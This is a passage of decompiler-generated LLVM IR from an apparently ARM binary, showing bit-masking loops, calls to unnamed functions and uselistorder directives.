  %v1_b110 = trunc i32 %v5_b10c to i8
  store i8 %v1_b110, i8* %v2_b100, align 1
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b118 = load i32, i32* @r8, align 4
  %v1_b118 = add i32 %v0_b118, 13
  %v2_b118 = inttoptr i32 %v1_b118 to i8*
  %v3_b118 = load i8, i8* %v2_b118, align 1
  %v4_b118 = zext i8 %v3_b118 to i32
  store i32 %v1_b11c, i32* %r2.global-to-local, align 4
  %v1_b120 = and i32 %v4_b118, 247
  %v5_b124 = or i32 %v1_b120, %v4_b124
  store i32 %v5_b124, i32* %r3.global-to-local, align 4
  %v1_b128 = trunc i32 %v5_b124 to i8
  store i8 %v1_b128, i8* %v2_b118, align 1
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_b130 = load i32, i32* @r8, align 4
  %v1_b130 = add i32 %v0_b130, 13
  %v2_b130 = inttoptr i32 %v1_b130 to i8*
  %v3_b130 = load i8, i8* %v2_b130, align 1
  %v4_b130 = zext i8 %v3_b130 to i32
  store i32 %v1_b134, i32* %r3.global-to-local, align 4
  %v1_b138 = and i32 %v4_b130, 251
  %v5_b13c = or i32 %v1_b138, %v4_b13c
  store i32 %v5_b13c, i32* %r2.global-to-local, align 4
  %v1_b140 = trunc i32 %v5_b13c to i8
  store i8 %v1_b140, i8* %v2_b130, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b148 = load i32, i32* @r8, align 4
  %v1_b148 = add i32 %v0_b148, 13
  %v2_b148 = inttoptr i32 %v1_b148 to i8*
  %v3_b148 = load i8, i8* %v2_b148, align 1
  %v4_b148 = zext i8 %v3_b148 to i32
  store i32 %v1_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = and i32 %v4_b148, 253
  %v4_b154 = or i32 %v1_b150, %v3_b154
  store i32 %v4_b154, i32* %r3.global-to-local, align 4
  %v1_b158 = trunc i32 %v4_b154 to i8
  store i8 %v1_b158, i8* %v2_b148, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b160 = load i32, i32* @r8, align 4
  %v1_b160 = add i32 %v0_b160, 13
  %v2_b160 = inttoptr i32 %v1_b160 to i8*
  %v3_b160 = load i8, i8* %v2_b160, align 1
  %v4_b160 = zext i8 %v3_b160 to i32
  %v1_b168 = and i32 %v4_b160, 254
  store i32 %v1_b168, i32* %r2.global-to-local, align 4
  %v2_b16c = or i32 %v1_b168, %v1_b164
  store i32 %v2_b16c, i32* %r3.global-to-local, align 4
  %v1_b170 = trunc i32 %v2_b16c to i8
  store i8 %v1_b170, i8* %v2_b160, align 1
  %v3_b174 = load i32, i32* @r8, align 4
  %v4_b174 = add i32 %v3_b174, 14
  %v5_b174 = inttoptr i32 %v4_b174 to i16*
  store i16 %v1_b0e0, i16* %v5_b174, align 2
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %v0_b17c = load i32, i32* @r4, align 4
  %v1_b17c = add i32 %v0_b17c, 40
  store i32 %v1_b17c, i32* %r0.global-to-local, align 4
  %v2_b180 = inttoptr i32 %v1_b17c to i16*
  %v3_b180 = call i32 @function_e264(i16* %v2_b180, i32 %v6_acdc)
  store i32 %v3_b180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aed4

dec_label_pc_b188:                                ; preds = %dec_label_pc_ad48
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_acdc, 40
  br label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_b188
  %storemerge6.pre-phi = phi i32 [ %v1_afd8, %dec_label_pc_aee8 ], [ %.pre, %dec_label_pc_b188 ]
  %v0_b1ac26 = phi i32 [ %v1_aedc, %dec_label_pc_aee8 ], [ 0, %dec_label_pc_b188 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_acdc, 65536
  %storemerge = add i32 %v6_acdc, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b198 = add i32 %storemerge4, 1310720
  store i32 %v1_b198, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b198, 256
  %v3_b1a0 = and i32 %tmp83, 65280
  store i32 %v3_b1a0, i32* %r3.global-to-local, align 4
  %v4_b1a4 = udiv i32 %v1_b198, 16777216
  %v5_b1a4 = or i32 %v3_b1a0, %v4_b1a4
  store i32 %v5_b1a4, i32* @r8, align 4
  %v2_b2d0 = icmp eq i32 %v1_acfc, 0
  br label %dec_label_pc_b1a8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b2b4, %dec_label_pc_b198
  %v0_b1ac = phi i32 [ %v0_b1ac26, %dec_label_pc_b198 ], [ 0, %dec_label_pc_b2b4 ], [ 0, %dec_label_pc_b1a8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ac = icmp eq i32 %v0_b1ac, 0
  store i1 %v2_b1ac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ac, label %dec_label_pc_b1a8, label %dec_label_pc_b1b8

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b2b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1bc

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b1e4, %dec_label_pc_b1b8
  %v1_b1c4 = phi i32 [ %v1_b2a4, %dec_label_pc_b1e4 ], [ 0, %dec_label_pc_b1b8 ]
  store i32 %v2_ab68, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b1c4 = mul i32 %v1_b1c4, 4
  %v5_b1c4 = add i32 %v4_b1c4, %v2_ab68
  %v6_b1c4 = inttoptr i32 %v5_b1c4 to i32*
  %v7_b1c4 = load i32, i32* %v6_b1c4, align 4
  store i32 %v7_b1c4, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @fp, align 4
  %v9_b1cc = icmp eq i32 %v0_b1cc, 65535
  store i1 %v9_b1cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b1d0 = add i32 %v7_b1c4, 20
  store i32 %v1_b1d0, i32* @r5, align 4
  br i1 %v9_b1cc, label %dec_label_pc_b2c8, label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_b1bc
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i1 %v2_b2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2d0, label %dec_label_pc_b1e4, label %dec_label_pc_b2dc

dec_label_pc_b1e4:                                ; preds = %dec_label_pc_b1d8, %dec_label_pc_b2c8, %dec_label_pc_b2dc
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b1e8 = load i32, i32* @r4, align 4
  %v3_b1e8 = add i32 %v2_b1e8, 10
  %v4_b1e8 = inttoptr i32 %v3_b1e8 to i16*
  store i16 0, i16* %v4_b1e8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1f0 = load i32, i32* @r4, align 4
  store i32 %v0_b1f0, i32* @r0, align 4
  %v2_b1f4 = call i32 @function_c848(i32 %v0_b1f0, i32 20)
  %v3_b1f4 = trunc i32 %v2_b1f4 to i16
  store i32 %v2_b1f4, i32* %r0.global-to-local, align 4
  %v3_b1f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab58, i32* %r2.global-to-local, align 4
  %v3_b200 = mul i32 %v3_b1f8, 16
  %v2_b204 = add i32 %v3_b200, %v2_ab58
  store i32 %v2_b204, i32* %r1.global-to-local, align 4
  %v1_b208 = add i32 %v2_b204, 4
  %v2_b208 = inttoptr i32 %v1_b208 to i32*
  %v3_b208 = load i32, i32* %v2_b208, align 4
  %v3_b20c = mul i32 %v3_b208, 65536
  store i32 %v3_b20c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b208, 256
  %v1_b214 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b208, 256
  %v4_b218 = urem i32 %tmp86, 256
  %v5_b218 = or i32 %v4_b218, %v1_b214
  store i32 %v5_b218, i32* %r3.global-to-local, align 4
  %v1_b21c = add i32 %v3_b208, 1
  store i32 %v1_b21c, i32* %r2.global-to-local, align 4
  store i32 %v1_b21c, i32* %v2_b208, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = load i32, i32* @r5, align 4
  %v2_b224 = add i32 %v1_b224, 4
  %v3_b224 = inttoptr i32 %v2_b224 to i32*
  store i32 %v0_b224, i32* %v3_b224, align 4
  %v0_b228 = load i32, i32* %r1.global-to-local, align 4
  %v1_b228 = add i32 %v0_b228, 8
  %v2_b228 = inttoptr i32 %v1_b228 to i32*
  %v3_b228 = load i32, i32* %v2_b228, align 4
  %tmp87 = mul i32 %v3_b228, 256
  %v1_b234 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b228, 256
  %v4_b238 = urem i32 %tmp88, 256
  %v5_b238 = or i32 %v4_b238, %v1_b234
  %v1_b23c = load i32, i32* @r5, align 4
  %v2_b23c = add i32 %v1_b23c, 8
  %v3_b23c = inttoptr i32 %v2_b23c to i32*
  store i32 %v5_b238, i32* %v3_b23c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b244 = load i32, i32* @r4, align 4
  %v4_b244 = add i32 %v3_b244, 10
  %v5_b244 = inttoptr i32 %v4_b244 to i16*
  store i16 %v3_b1f4, i16* %v5_b244, align 2
  %v0_b248 = load i32, i32* @r5, align 4
  store i32 %v0_b248, i32* @r1, align 4
  %v0_b24c = load i32, i32* %r3.global-to-local, align 4
  %v1_b24c = trunc i32 %v0_b24c to i16
  %v3_b24c = add i32 %v0_b248, 16
  %v4_b24c = inttoptr i32 %v3_b24c to i16*
  store i16 %v1_b24c, i16* %v4_b24c, align 2
  %v0_b250 = load i32, i32* @r8, align 4
  store i32 %v0_b250, i32* %r2.global-to-local, align 4
  %v0_b254 = load i32, i32* @sl, align 4
  store i32 %v0_b254, i32* %r3.global-to-local, align 4
  %v0_b258 = load i32, i32* @r4, align 4
  store i32 %v0_b258, i32* %r0.global-to-local, align 4
  %v4_b25c = call i32 @function_c898(i32 %v0_b258, i32 %v0_b248, i32 %v0_b250, i32 %v0_b254)
  %v5_b25c = trunc i32 %v4_b25c to i16
  store i32 %v4_b25c, i32* %r0.global-to-local, align 4
  %v3_b260 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b260, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b268 = mul i32 %v3_b260, 32
  store i32 %v3_b268, i32* %lr.global-to-local, align 4
  %v3_b26c = load i32, i32* @r5, align 4
  %v4_b26c = add i32 %v3_b26c, 16
  %v5_b26c = inttoptr i32 %v4_b26c to i16*
  store i16 %v5_b25c, i16* %v5_b26c, align 2
  %v0_b270 = load i32, i32* %lr.global-to-local, align 4
  %v1_b270 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b270, -8
  %v5_b270 = add i32 %v0_b270, %tmp105
  store i32 %v5_b270, i32* %lr.global-to-local, align 4
  %v0_b274 = load i32, i32* @r5, align 4
  %v1_b274 = add i32 %v0_b274, 2
  %v2_b274 = inttoptr i32 %v1_b274 to i16*
  %v3_b274 = load i16, i16* %v2_b274, align 2
  %v1_b278 = load i32, i32* %ip.global-to-local, align 4
  %v2_b278 = add i32 %v1_b278, %v5_b270
  store i32 %v2_b278, i32* @lr, align 4
  %v3_b27c = add i32 %v2_b278, 2
  %v4_b27c = inttoptr i32 %v3_b27c to i16*
  store i16 %v3_b274, i16* %v4_b27c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b288 = load i32, i32* @r4, align 4
  store i32 %v0_b288, i32* %r1.global-to-local, align 4
  %v0_b28c = load i32, i32* @sb, align 4
  store i32 %v0_b28c, i32* %r0.global-to-local, align 4
  %v0_b290 = load i32, i32* @r7, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @lr, align 4
  %v6_b29c = call i32 @function_11a68(i32 %v0_b28c, i32 %v0_b288, i32 %v0_b290, i32 16384, i32 %v0_b294, i32 16)
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  %v1_b2a4 = add i32 %v3_b2a0, 1
  store i32 %v1_b2a4, i32* %r0.global-to-local, align 4
  %v0_b2a8 = load i32, i32* @r6, align 4
  %v9_b2a8 = icmp eq i32 %v0_b2a8, %v1_b2a4
  store i1 %v9_b2a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2a4, i32* %stack_var_-44, align 4
  %v8_b2b0 = icmp sgt i32 %v0_b2a8, %v1_b2a4
  br i1 %v8_b2b0, label %dec_label_pc_b1bc, label %dec_label_pc_b2b4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b1e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2b8 = icmp eq i32 %v0_b2a8, 0
  store i1 %v2_b2b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2b8, label %dec_label_pc_b1a8, label %dec_label_pc_b1b8

dec_label_pc_b2c8:                                ; preds = %dec_label_pc_b1bc
  %v0_b2c8 = call i32 @function_e0d0()
  %v1_b2c8 = trunc i32 %v0_b2c8 to i16
  store i32 %v0_b2c8, i32* %r0.global-to-local, align 4
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i1 %v2_b2d0, i1* %cpsr_z.global-to-local, align 1
  %v3_b2d4 = load i32, i32* @r4, align 4
  %v4_b2d4 = add i32 %v3_b2d4, 4
  %v5_b2d4 = inttoptr i32 %v4_b2d4 to i16*
  store i16 %v1_b2c8, i16* %v5_b2d4, align 2
  br i1 %v2_b2d0, label %dec_label_pc_b1e4, label %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge

dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge:    ; preds = %dec_label_pc_b2c8
  %v0_b2dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b2dc

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge, %dec_label_pc_b1d8
  %v0_b2dc = phi i32 [ %v0_b2dc.pre, %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge ], [ %v7_b1c4, %dec_label_pc_b1d8 ]
  %v1_b2dc = add i32 %v0_b2dc, 40
  store i32 %v1_b2dc, i32* %r0.global-to-local, align 4
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %v2_b2e4 = inttoptr i32 %v1_b2dc to i16*
  %v3_b2e4 = call i32 @function_e264(i16* %v2_b2e4, i32 %v6_acdc)
  store i32 %v3_b2e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1e4

; uselistorder directives
  uselistorder i32 %v0_b2c8, { 1, 0 }
  uselistorder i32 %v1_b2a4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b270, { 1, 0 }
  uselistorder i32 %v4_b25c, { 1, 0 }
  uselistorder i32 %v3_b228, { 1, 0 }
  uselistorder i32 %v3_b208, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b1f4, { 1, 0 }
  uselistorder i1 %v2_b2d0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b0e0, { 1, 0 }
  uselistorder i32 %v0_b018, { 1, 0 }
  uselistorder i32 %v5_afac, { 1, 0 }
  uselistorder i32 %v0_af6c, { 1, 0 }
  uselistorder i32 %v0_af28, { 1, 2, 0, 3 }
  uselistorder i32 %v1_aed8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_aec4, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae50, { 1, 0 }
  uselistorder i32 %v6_ae48, { 0, 2, 1, 3 }
  uselistorder i1 %v9_ae78, { 1, 0 }
  uselistorder i32 %v4_ae8c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_add4, { 1, 0, 2 }
  uselistorder i32 %v0_af84, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_adc4, { 1, 0 }
  uselistorder i1 %v7_adbc, { 1, 0, 2 }
  uselistorder i1 %v7_ad70, { 1, 0 }
  uselistorder i32 %v3_ad6c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b14c, { 1, 0 }
  uselistorder i32 %v1_b134, { 1, 0 }
  uselistorder i32 %v1_b11c, { 1, 0 }
  uselistorder i32 %v1_b104, { 1, 0 }
  uselistorder i32 %v1_b0ec, { 1, 0 }
  uselistorder i32 %v3_ae84, { 1, 0 }
  uselistorder i1 %v2_aea0, { 1, 0 }
  uselistorder i32 %v1_ae9c, { 1, 0 }
  uselistorder i32 %v4_ae98, { 2, 0, 1 }
  uselistorder i32 %v2_adac, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad48, { 1, 0 }
  uselistorder i1 %v7_ad40, { 1, 0 }
  uselistorder i1 %v7_ad14, { 1, 0 }
  uselistorder i32 %v3_ad10, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_acfc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_acdc, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v1_ac44, { 1, 0 }
  uselistorder i32 %v1_ac24, { 1, 0 }
  uselistorder i32 %v6_ac00, { 1, 0 }
  uselistorder i32 %v1_abe8, { 1, 0 }
  uselistorder i8 %v5_aba0, { 1, 0 }
  uselistorder i32 %v6_ab80, { 1, 0 }
  uselistorder i32 %v2_ab68, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab58, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1b8, { 1, 0 }
  uselistorder label %dec_label_pc_b1a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b198, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aed4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae10, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_adcc, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_ad7c, { 1, 0 }
  uselistorder label %dec_label_pc_ad60, { 1, 0 }
}

define i32 @function_b2f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b2f0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b2f0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b30c = call i32 @function_12654(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b318 = load i32, i32* @r6, align 4
  store i32 %v0_b318, i32* %r0.global-to-local, align 4
  %v2_b31c = call i32 @function_12654(i32 %v0_b318, i32 4)
  %v0_b320 = load i32, i32* @r5, align 4
  store i32 %v0_b320, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b330 = load i32, i32* @r4, align 4
  store i32 %v0_b330, i32* %r0.global-to-local, align 4
  %v5_b334 = inttoptr i32 %v0_b320 to i32*
  %v6_b334 = call i32 @function_8570(i32 %v0_b330, i32* %v5_b334, i32 2, i32 0)
  %v1_b340 = urem i32 %v6_b334, 256
  store i32 %v1_b340, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b34c = load i32, i32* @r5, align 4
  store i32 %v0_b34c, i32* %r1.global-to-local, align 4
  %v0_b350 = load i32, i32* @r4, align 4
  store i32 %v0_b350, i32* %r0.global-to-local, align 4
  %v5_b354 = trunc i32 %v6_b334 to i8
  %v6_b358 = inttoptr i32 %v0_b34c to i32*
  %v7_b358 = call i32 @function_8570(i32 %v0_b350, i32* %v6_b358, i32 3, i32 65535)
  %v0_b35c = load i32, i32* @r5, align 4
  store i32 %v0_b35c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b358, i32* @r7, align 4
  %v0_b36c = load i32, i32* @r4, align 4
  store i32 %v0_b36c, i32* %r0.global-to-local, align 4
  %v4_b370 = inttoptr i32 %v0_b35c to i32*
  %v5_b370 = call i32 @function_8570(i32 %v0_b36c, i32* %v4_b370, i32 4, i32 64)
  %v1_b378 = urem i32 %v5_b370, 256
  store i32 %v1_b378, i32* %ip.global-to-local, align 4
  %v0_b37c = load i32, i32* @r5, align 4
  store i32 %v0_b37c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b388 = load i32, i32* @r4, align 4
  store i32 %v0_b388, i32* %r0.global-to-local, align 4
  %v6_b390 = inttoptr i32 %v0_b37c to i32*
  %v7_b390 = call i32 @function_8570(i32 %v0_b388, i32* %v6_b390, i32 5, i32 1)
  %v1_b39c = urem i32 %v7_b390, 256
  store i32 %v1_b39c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3a4 = load i32, i32* @r5, align 4
  store i32 %v0_b3a4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v5_b3b4 = inttoptr i32 %v0_b3a4 to i32*
  %v6_b3b4 = call i32 @function_8570(i32 %v0_b3ac, i32* %v5_b3b4, i32 7, i32 65535)
  %v0_b3b8 = load i32, i32* @r5, align 4
  store i32 %v0_b3b8, i32* %r1.global-to-local, align 4
  %v3_b3bc = mul i32 %v6_b3b4, 65536
  store i32 %v3_b3bc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v3_b3cc = urem i32 %v6_b3b4, 65536
  store i32 %v3_b3cc, i32* @sl, align 4
  %v4_b3d0 = inttoptr i32 %v0_b3b8 to i32*
  %v5_b3d0 = call i32 @function_8570(i32 %v0_b3c8, i32* %v4_b3d0, i32 11, i32 0)
  %v1_b3d8 = urem i32 %v5_b3d0, 256
  store i32 %v1_b3d8, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* @r5, align 4
  store i32 %v0_b3dc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* @r4, align 4
  store i32 %v0_b3e8, i32* %r0.global-to-local, align 4
  %v5_b3f0 = inttoptr i32 %v0_b3dc to i32*
  %v6_b3f0 = call i32 @function_8570(i32 %v0_b3e8, i32* %v5_b3f0, i32 12, i32 1)
  %v1_b3f8 = urem i32 %v6_b3f0, 256
  store i32 %v1_b3f8, i32* %ip.global-to-local, align 4
  %v0_b3fc = load i32, i32* @r5, align 4
  store i32 %v0_b3fc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v5_b410 = inttoptr i32 %v0_b3fc to i32*
  %v6_b410 = call i32 @function_8570(i32 %v0_b408, i32* %v5_b410, i32 13, i32 1)
  %v1_b418 = urem i32 %v6_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @function_8570(i32 %v0_b428, i32* %v5_b430, i32 14, i32 0)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @function_8570(i32 %v0_b448, i32* %v5_b450, i32 15, i32 0)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @function_8570(i32 %v0_b468, i32* %v5_b470, i32 16, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b484 = load i32, i32* @r5, align 4
  store i32 %v0_b484, i32* %r1.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
